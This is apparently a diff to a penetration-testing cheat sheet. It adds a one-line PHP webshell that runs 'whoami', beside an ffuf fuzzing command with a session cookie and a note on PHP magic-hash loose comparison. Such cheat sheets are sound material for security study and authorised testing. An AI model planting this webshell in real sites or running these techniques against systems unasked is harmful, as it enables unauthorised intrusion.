@@ -74,6 +74,10 @@ Subdomain fuzz
 	ffuf -u http://targeturl.com/FUZZ -w /wordlist.txt -b "PHPSESSID=33ptqlqcbf3odc4a9e0l1qa65d"
 Fuzz with cookie  
 
+### Webshells
+	<?php system("whoami")?>
+PHP webshell  
+
 ### Magic hashes
 PHP Loose comparison with magic hashes (0e...)  
 Set inputs to 0  
